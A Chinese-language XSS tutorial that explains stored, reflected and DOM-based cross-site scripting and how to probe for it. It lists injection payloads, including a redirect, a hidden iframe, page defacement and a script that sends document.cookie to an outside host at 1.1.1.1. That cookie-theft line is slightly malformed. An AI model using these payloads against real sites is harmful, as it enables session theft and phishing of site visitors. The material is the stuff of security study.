# XSS(跨站脚本)

> 与SQL注入攻击类似，SQL注入攻击以SQL语句作为用户输入，从而达到查询/修改、删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户浏览器的控制。**漏洞存在于服务器端，攻击对象为WEB客户端。**【[原理](https://www.zhuyingda.com/blog/article.html?id=2)：为了使用户体验更好等因素，有部分代码会在浏览器中执行】

**使用场景：**

- 直接嵌入html：<script>alert('XSS');</script>
- 元素标签事件：<body onload=alert('XSS')>
- 图片元素：<img src="javascript:alert('XSS');">
- 其他标签：<iframe>,<div>,and<link>
- DOM对象，篡改页面内容

**可实现攻击方式：**

1. 盗取cookie（若浏览器正在登录状态）
2. 重定向到特点站点（可做钓鱼页面）

**攻击参与方：** 攻击者，被攻击者，漏洞站点，第三方站点（攻击目标/攻击参与站）

**漏洞形成根源：** 服务器对用户提交数据过滤不严，提交给服务器的脚本被直接返回给其他客户端执行；脚本在客户端执行恶意操作



**XSS漏洞类型详解：** 

*特点：* 注入代码可能是一个片段或完整的语句，客户端提交到服务器，服务器**原封不动**地返回客户端；探测时，通过爬网，观察变量。每个变量都进行测试，只要提交的数据或代码被**原封不动**地返回，则有可能存在XSS漏洞。

1. 存储型（持久型）
2. 反射型（非持久型）【盗取cookie，重定向，安装键盘记录器等】
3. DOM型（本地执行）





#### 示例：

##### 反射性注入：

*测试是否存在XSS* ，依据：是否原封不动地将输入返回【可能在页面，也有可能在返回的源码】

![XSS1](img/XSS/XSS1.png)

如图可知提交的数据全部完整的返回了

```
注入 <a href="http://192.168.1.1">click</a>       创建一条超链接
```

![XSS](img/XSS/XSS2.png)

可以创建自己的超链接，在别人网站实施挂马，重定向等操作

**注入脚本** 

```
<script>alert('XSS')</script>     #可以用于检测是否存在XSS漏洞 
```

![XSS3](img/XSS/XSS3.png)

```
<a href="onclick=alert('XSS')">type</a>   #使用burpsuite发送，需要进行URL编码
```

![XSS4](img/XSS/XSS4.png)

```
<img  src="http://1.1.1.1/a.jpg" onerror=alert('XSS')>  #当请求找不到图片，触发
```



**漏洞利用** 

1. 重定向：`<script>window.location="http://www.sina.com"</script>`

   ​               `<iframe src="http://1.1.1.1" height="0" width="0"></iframe>`

   

2. 窃取浏览当前页面的用户的cookie信息：`<script>new image().src="http://1.1.1.1/c.php?output="+document.cookie;"</script>  `

3. 篡改页面：`<script>document.body.innerHtml="<div style=visibility:visible;><h1>THIS WEBSITE IS UNDER ATTACK</h1></div>"</script>`

4. 集成复杂代码：将代码集成为一个html文件，然后伪造钓鱼网站链接，结合社工，进行攻击

5. 使目标服务器到黑客控制的肉鸡服务器上拿一个功能性的脚本文件，在交由客户端去执行。

























